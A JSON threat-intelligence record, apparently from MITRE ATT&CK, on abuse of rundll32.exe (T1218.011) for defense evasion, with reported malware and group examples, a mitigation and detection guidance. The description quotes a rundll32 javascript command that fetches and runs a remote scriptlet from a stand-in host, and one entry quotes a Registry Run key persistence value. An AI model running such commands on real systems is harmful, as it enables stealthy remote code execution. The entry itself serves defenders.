{"TTP_id": "enterprise-TA0005-T1218-T1218.011", "TTP_name": "Rundll32", "Description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. [1]Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks. [2]Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones.[3][4] DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[5]", "Property": {"ID": "T1218.011", "Sub-technique of": "T1218", "Tactic": "Defense Evasion", "Platforms": "Windows", "Defense Bypassed": "Anti-virus, Application control, Digital Certificate Validation", "Contributors": "Casey Smith; Gareth Phillips, Seek Ltd.; James_inthe_box, Me; Ricardo Dias", "Version": "2.0", "Created": "23 January 2020", "Last Modified": "19 April 2022"}, "Examples": {"S0045": ["https://attack.mitre.org/software/S0045", "ADVSTORESHELL", "ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.[6]"], "G0073": ["https://attack.mitre.org/groups/G0073", "APT19", "APT19 configured its payload to inject into the rundll32.exe.[7]"], "G0007": ["https://attack.mitre.org/groups/G0007", "APT28", "APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe \"C:\\Windows\\twain_64.dll\". APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[8][6][9][10][11][12]"], "G0016": ["https://attack.mitre.org/groups/G0016", "APT29", "APT29 has used Rundll32.exe to execute payloads.[13][14][15]"], "G0022": ["https://attack.mitre.org/groups/G0022", "APT3", "APT3 has a tool that can run DLLs.[16]"], "G0050": ["https://attack.mitre.org/groups/G0050", "APT32", "APT32 malware has used rundll32.exe to execute an initial infection process.[17]"], "G0082": ["https://attack.mitre.org/groups/G0082", "APT38", "APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.[18]"], "G0096": ["https://attack.mitre.org/groups/G0096", "APT41", "APT41 has used rundll32.exe to execute a loader.[19]"], "S0438": ["https://attack.mitre.org/software/S0438", "Attor", "Attor's installer plugin can schedule rundll32.exe to load the dispatcher.[20]"], "S0093": ["https://attack.mitre.org/software/S0093", "Backdoor.Oldrea", "Backdoor.Oldrea can use rundll32 for execution on compromised hosts.[21]"], "S0606": ["https://attack.mitre.org/software/S0606", "Bad Rabbit", "Bad Rabbit has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.[22]"], "S0268": ["https://attack.mitre.org/software/S0268", "Bisonal", "Bisonal has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"vert\" = \"rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez\".[23]"], "S0520": ["https://attack.mitre.org/software/S0520", "BLINDINGCAN", "BLINDINGCAN has used Rundll32 to load a malicious DLL.[24]"], "G0108": ["https://attack.mitre.org/groups/G0108", "Blue Mockingbird", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.[25]"], "S0635": ["https://attack.mitre.org/software/S0635", "BoomBox", "BoomBox can use RunDLL32 for execution.[26]"], "S0204": ["https://attack.mitre.org/software/S0204", "Briba", "Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.[27]"], "G0008": ["https://attack.mitre.org/groups/G0008", "Carbanak", "Carbanak installs VNC server software that executes through rundll32.[28]"], "S0154": ["https://attack.mitre.org/software/S0154", "Cobalt Strike", "Cobalt Strike can use rundll32.exe to load DLL from the command line.[29]"], "S0244": ["https://attack.mitre.org/software/S0244", "Comnie", "Comnie uses Rundll32 to load a malicious DLL.[30]"], "G0052": ["https://attack.mitre.org/groups/G0052", "CopyKittens", "CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.[31]"], "S0137": ["https://attack.mitre.org/software/S0137", "CORESHELL", "CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"[32]"], "S0046": ["https://attack.mitre.org/software/S0046", "CozyCar", "The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.[33]"], "S0255": ["https://attack.mitre.org/software/S0255", "DDKONG", "DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.[34]"], "S0554": ["https://attack.mitre.org/software/S0554", "Egregor", "Egregor has used rundll32 during execution.[35]"], "S0081": ["https://attack.mitre.org/software/S0081", "Elise", "After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.[36]"], "S0082": ["https://attack.mitre.org/software/S0082", "Emissary", "Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.[37]"], "S0634": ["https://attack.mitre.org/software/S0634", "EnvyScout", "EnvyScout has the ability to proxy execution of malicious files with Rundll32.[26]"], "S0568": ["https://attack.mitre.org/software/S0568", "EVILNUM", "EVILNUM can execute commands and scripts through rundll32.[38]"], "S0512": ["https://attack.mitre.org/software/S0512", "FatDuke", "FatDuke can execute via rundll32.[39]"], "S0267": ["https://attack.mitre.org/software/S0267", "FELIXROOT", "FELIXROOT uses Rundll32 for executing the dropper program.[40][41]"], "S0143": ["https://attack.mitre.org/software/S0143", "Flame", "Rundll32.exe is used as a way of executing Flame at the command-line.[42]"], "G0047": ["https://attack.mitre.org/groups/G0047", "Gamaredon Group", "Gamaredon Group malware has used rundll32 to launch additional malicious components.[43]"], "S0032": ["https://attack.mitre.org/software/S0032", "gh0st RAT", "A gh0st RAT variant has used rundll32 for execution.[44]"], "S0342": ["https://attack.mitre.org/software/S0342", "GreyEnergy", "GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).[41]"], "G0125": ["https://attack.mitre.org/groups/G0125", "HAFNIUM", "HAFNIUM has used rundll32 to load malicious DLLs.[45]"], "S0698": ["https://attack.mitre.org/software/S0698", "HermeticWizard", "HermeticWizard has the ability to create a new process using rundll32.[46]"], "S0260": ["https://attack.mitre.org/software/S0260", "InvisiMole", "InvisiMole has used rundll32.exe for execution.[47]"], "S0044": ["https://attack.mitre.org/software/S0044", "JHUHUGIT", "JHUHUGIT is executed using rundll32.exe.[48][49]"], "G0094": ["https://attack.mitre.org/groups/G0094", "Kimsuky", "Kimsuky has used rundll32.exe to execute malicious scripts and malware on a victim's network.[50]"], "S0250": ["https://attack.mitre.org/software/S0250", "Koadic", "Koadic can use Rundll32 to execute additional payloads.[51]"], "S0356": ["https://attack.mitre.org/software/S0356", "KONNI", "KONNI has used Rundll32 to execute its loader for privilege escalation purposes.[52][53]"], "S0236": ["https://attack.mitre.org/software/S0236", "Kwampirs", "Kwampirs uses rundll32.exe in a Registry value added to establish persistence.[54]"], "G0032": ["https://attack.mitre.org/groups/G0032", "Lazarus Group", "Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.[55][56][57]"], "G0140": ["https://attack.mitre.org/groups/G0140", "LazyScripter", "LazyScripter has used rundll32.exe to execute Koadic stagers.[58]"], "S0167": ["https://attack.mitre.org/software/S0167", "Matryoshka", "Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.[59]"], "S0576": ["https://attack.mitre.org/software/S0576", "MegaCortex", "MegaCortex has used rundll32.exe to load a DLL for file encryption.[60]"], "S0256": ["https://attack.mitre.org/software/S0256", "Mosquito", "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.[61]"], "G0069": ["https://attack.mitre.org/groups/G0069", "MuddyWater", "MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.[62]"], "S0637": ["https://attack.mitre.org/software/S0637", "NativeZone", "NativeZone has used rundll32 to execute a malicious DLL.[63]"], "S0353": ["https://attack.mitre.org/software/S0353", "NOKKI", "NOKKI has used rundll32 for execution.[64]"], "S0368": ["https://attack.mitre.org/software/S0368", "NotPetya", "NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.[65]"], "S0518": ["https://attack.mitre.org/software/S0518", "PolyglotDuke", "PolyglotDuke can be executed using rundll32.exe.[39]"], "S0139": ["https://attack.mitre.org/software/S0139", "PowerDuke", "PowerDuke uses rundll32.exe to load.[66]"], "S0113": ["https://attack.mitre.org/software/S0113", "Prikormka", "Prikormka uses rundll32.exe to load its DLL.[67]"], "S0147": ["https://attack.mitre.org/software/S0147", "Pteranodon", "Pteranodon executes functions using rundll32.exe.[68]"], "S0196": ["https://attack.mitre.org/software/S0196", "PUNCHBUGGY", "PUNCHBUGGY can load a DLL using Rundll32.[69]"], "S0650": ["https://attack.mitre.org/software/S0650", "QakBot", "QakBot can use Rundll32.exe to enable C2 communication.[70][71][72][73]"], "S0481": ["https://attack.mitre.org/software/S0481", "Ragnar Locker", "Ragnar Locker has used rundll32.exe to execute components of VirtualBox.[74]"], "S0148": ["https://attack.mitre.org/software/S0148", "RTM", "RTM runs its core DLL file using rundll32.exe.[75][76]"], "S0074": ["https://attack.mitre.org/software/S0074", "Sakula", "Sakula calls cmd.exe to run various DLL files via rundll32.[77]"], "G0034": ["https://attack.mitre.org/groups/G0034", "Sandworm Team", "Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.[78]"], "S0382": ["https://attack.mitre.org/software/S0382", "ServHelper", "ServHelper contains a module for downloading and executing DLLs that leverages rundll32.exe.[79]"], "S0589": ["https://attack.mitre.org/software/S0589", "Sibot", "Sibot has executed downloaded DLLs with rundll32.exe.[80]"], "S0142": ["https://attack.mitre.org/software/S0142", "StreamEx", "StreamEx uses rundll32 to call an exported function.[81]"], "S0559": ["https://attack.mitre.org/software/S0559", "SUNBURST", "SUNBURST used Rundll32 to execute payloads.[14]"], "G0092": ["https://attack.mitre.org/groups/G0092", "TA505", "TA505 has leveraged rundll32.exe to execute malicious DLLs.[82][79]"], "G0127": ["https://attack.mitre.org/groups/G0127", "TA551", "TA551 has used rundll32.exe to load malicious DLLs.[83]"], "S0452": ["https://attack.mitre.org/software/S0452", "USBferry", "USBferry can execute rundll32.exe in memory to avoid detection.[84]"], "S0141": ["https://attack.mitre.org/software/S0141", "Winnti for Windows", "The Winnti for Windows installer loads a DLL using rundll32.[85][86]"], "S0412": ["https://attack.mitre.org/software/S0412", "ZxShell", "ZxShell has used rundll32.exe to execute other DLLs and named pipes.[87]"]}, "Mitigation": {"M1050": ["https://attack.mitre.org/mitigations/M1050", "Exploit Protection", "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control."]}, "Detection": {"Command Execution": ["Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.", "DS0017", "https://attack.mitre.org/datasources/DS0017", "Command"], "File Metadata": ["Analyze contextual data about executed DLL files, which may include information such as name, the content (ex: signature, headers, or data/media), age, user/ower, permissions, etc.", "DS0022", "https://attack.mitre.org/datasources/DS0022", "File"], "Module Load": ["Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.", "DS0011", "https://attack.mitre.org/datasources/DS0011", "Module"], "Process Creation": ["Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.", "DS0009", "https://attack.mitre.org/datasources/DS0009", "Process"]}}
